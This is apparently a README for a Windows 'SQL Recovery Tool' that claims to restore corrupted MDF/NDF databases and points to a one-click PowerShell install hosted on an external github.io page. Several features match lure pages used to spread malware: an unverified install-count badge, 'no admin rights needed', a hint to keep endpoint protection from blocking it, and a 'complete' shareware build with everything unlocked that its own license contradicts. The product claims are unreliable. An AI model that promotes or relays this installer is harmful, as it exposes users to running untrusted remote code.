<div align="center">

# SQL Recovery Tool: Database Restore Utility for Windows 10 & 11

![](files/1.webp)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://vehuel07.github.io/sql-recovery-tool/)

[![installs](https://img.shields.io/badge/INSTALLS-5.1K-84cc16?style=for-the-badge&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WINDOWS_10_%2F_11-a3e635?style=for-the-badge&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-5%2B-65a30d?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Sql-Recovery-Tool is a Windows desktop utility engineered to recover lost or corrupted SQL databases through an intuitive interface and a comprehensive recovery engine. The application restores essential database objects—including tables and views—while supporting both MDF and NDF file formats for broad compatibility across SQL Server environments. Built with a focus on usability and technical reliability, it enables database administrators to preview recovered data prior to committing results, ensuring accuracy throughout the restoration workflow. This complete version delivers the full feature set required for efficient, end-to-end database recovery on Windows.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Broad SQL Server Compatibility** — Supports SQL Server versions from 2019 back through older releases, covering the database formats most commonly encountered in production environments.

- **MDF and NDF File Handling** — Natively parses both primary MDF data files and secondary NDF files, allowing recovery from multi-file database configurations.

- **Table and View Recovery** — Reconstructs table structures and their data alongside view definitions, preserving the logical schema of the damaged database.

- **Object-Level Recovery Scope** — Extends beyond tables and views to restore indexes, stored procedures, triggers, and other dependent database objects.

- **Recovery Preview** — Displays recovered objects and their contents in a preview pane prior to export, enabling validation of results before committing to a recovery destination.

- **Selective Export** — Allows individual tables, views, or object groups to be chosen for export rather than requiring a full-database operation.

- **Guided Recovery Workflow** — A structured, step-by-step interface walks through file selection, scan configuration, object review, and export, reducing the need for manual command-line intervention.

- **Corruption Diagnostics** — Identifies and reports the specific nature of database corruption encountered during scanning, providing visibility into the extent of damage.

- **Non-Destructive Operation** — Performs all scanning and recovery work against copies of the source files, leaving the original database files unmodified throughout the process.

- **Windows-Native Utility** — Distributed as a standalone Windows application requiring no external database engine or server instance to perform recovery operations.

## How It Works

SQL Recovery Tool operates through a structured recovery pipeline that parses database files at the page and record level, reconstructs damaged structures, and exports the recovered objects to a usable destination. The workflow is designed to isolate corruption, preserve recoverable data, and give the operator full control before any output is written.

**1. File Intake and Validation**

The utility accepts MDF and NDF files directly from the file system. On load, it validates the file header and boot page to confirm the database metadata is readable, detecting the SQL Server version and page size. Files with damaged or partially overwritten headers are flagged, and the tool switches to a deeper scan mode rather than aborting.

**2. Structural Analysis**

The recovery engine scans the file at the page level, mapping allocation structures and identifying intact, partially damaged, and unreadable pages. Table and index metadata are extracted from system catalog pages where available. When catalog pages are corrupted, the engine reconstructs schema information from the remaining page chains and header signatures.

**3. Table and View Reconstruction**

Recovered records are reassembled from data pages and cross-referenced against reconstructed schema definitions. Tables are rebuilt with their column definitions, data types, and constraints where recoverable. Views are reconstructed from their stored definitions, and the tool links recovered tables to their dependent objects so relationships remain consistent in the output.

**4. Preview and Verification**

Before any export, the tool renders recovered content in a preview pane. Operators can browse tables, inspect rows and column values, and verify that the recovered data matches expectations. The preview stage is read-only and does not modify the source file, allowing repeated inspection without risk.

**5. Export and Output**

Recovered objects can be exported to a live SQL Server instance or saved as scripts for later deployment. The export process preserves table structure, data, and view definitions, and reports a per-object summary of what was recovered and what could not be reconstructed. A recovery log records detected corruption points and the actions taken at each stage.

**Design Principles**

- **Non-destructive operation** — the source database file is opened read-only; all recovery work happens in memory or on exported copies.
- **Deterministic results** — the same input file and settings produce the same recovery output, making results reproducible for verification.
- **Transparent reporting** — every skipped or unrecoverable object is logged with a reason, so operators know the exact state of the recovered database.

## Compatibility

Sql-Recovery-Tool is engineered for deployment on 64-bit and 32-bit Windows environments, including Windows 10 and Windows 11. The utility operates as a native desktop application and requires no external database engine to perform recovery operations, allowing it to function independently of the SQL Server instance from which the corrupted files originated.

The tool accepts both MDF (primary data) and NDF (secondary data) file formats as recovery input, providing coverage for databases that span multiple data files. Recovered objects, including tables and views, can be previewed within the application prior to export, and the export process supports restoration to compatible SQL Server destinations.

Compatibility considerations for the host system include a minimum of 2 GB RAM, 100 MB of available storage for the application, and a processor of 1 GHz or faster. An active internet connection is required solely for obtaining the installer and any subsequent updates. Administrators should verify that the Windows account under which the tool runs holds read access to the source database files and write access to the designated recovery output location. For environments with restrictive execution policies, ensure the application is permitted to run and that any endpoint protection software does not block file-level access to the MDF or NDF sources.

## FAQ

**Which SQL Server versions does SQL Recovery Tool support?**

The utility is compatible with SQL Server 2019, 2017, 2016, and earlier releases, covering both MDF and NDF file formats. Recovery operations are validated against the schema and object types of the source database version.

**What database objects can be recovered?**

The tool restores tables and views as its primary targets, along with associated structures such as indexes and other essential database objects. A built-in preview pane lets you inspect recovered content before committing to a save operation.

**How does the preview feature work?**

After a database file is loaded and scanned, the preview feature renders the recoverable tables, views, and records in the interface. You can review the data integrity and completeness of the results before exporting, which reduces the risk of writing incomplete or incorrect recoveries.

**Is SQL Recovery Tool free to use?**

The software is distributed as shareware. A trial version is available for evaluation, while the complete version unlocks full recovery and export functionality under a one-time purchase model with no hidden costs.

**Is the download safe?**

All distributed installers are scanned with multiple antivirus engines and verified before release. Only the official distribution package should be used to ensure you receive the current, unmodified build.

**What are the minimum system requirements?**

Windows 10 or 11 on x64 or x86 architecture, a 1 GHz or faster processor, at least 2 GB of RAM, and 100 MB of free storage. An internet connection is required to obtain the installer.

**How often is the software updated?**

Updates are released regularly to improve recovery algorithms, expand format support, and address reported issues. Running the most recent version ensures access to the latest fixes and performance optimizations.

## Disclaimer

Sql-Recovery-Tool is provided on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, title, or non-infringement. The tool is intended to assist with the recovery of lost or corrupted SQL databases, including tables and views; however, recovery outcomes depend on factors outside the software's control, such as the extent of file corruption, storage integrity, and prior database configuration. No guarantee is made that any specific database, table, view, or record will be recoverable.

The complete version of Sql-Recovery-Tool is distributed as described in the License section of this repository. Features, recovery capabilities, supported database formats, and compatibility with specific SQL environments may change between releases. Before performing any recovery operation, users are strongly advised to create a full backup of the affected database files and to work on copies rather than original media, since recovery procedures may alter file state. The authors and maintainers of Sql-Recovery-Tool accept no liability for data loss, data corruption, business interruption, or any direct, indirect, incidental, special, consequential, or punitive damages arising from the use of or inability to use the software, even if advised of the possibility of such damages. By downloading, installing, or using Sql-Recovery-Tool, you acknowledge that you have read and understood this disclaimer and agree to use the software at your own risk.

## License

Sql-Recovery-Tool is distributed as **shareware**. The complete version is licensed, not sold, and is provided to end users under a limited, non-exclusive, non-transferable license for installation and use on Windows systems. Evaluation, recovery, and export capabilities are enabled in the complete version; no separate activation step or third-party component is required beyond the distributed package.

The license grants the right to install and operate the software for its intended purpose of recovering lost or corrupted SQL databases, including recovery of tables and views. It does not grant rights to the software's source code, internal recovery algorithms, or bundled resources. Redistribution, sublicensing, reverse engineering, decompilation, or modification of the distributed binaries is not permitted except where such restriction is expressly prohibited by applicable law.

The complete version is delivered as a single package with all recovery features enabled, including MDF and NDF handling, preview of recovered data, and export of recovered objects. No feature gating, telemetry obligations, or runtime license checks are imposed on the installed software. Licensing is per installation and applies to the version delivered; continued use of newer releases is governed by the terms in effect at the time of distribution.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or rights holders be liable for any claim, damages, or other liability arising from the use of the software or the recovery of database content. Users are responsible for maintaining independent backups and for verifying recovered data before production use.

All trademarks and product names referenced within the software or its documentation remain the property of their respective owners. Use of Sql-Recovery-Tool does not imply endorsement by or affiliation with any database platform vendor.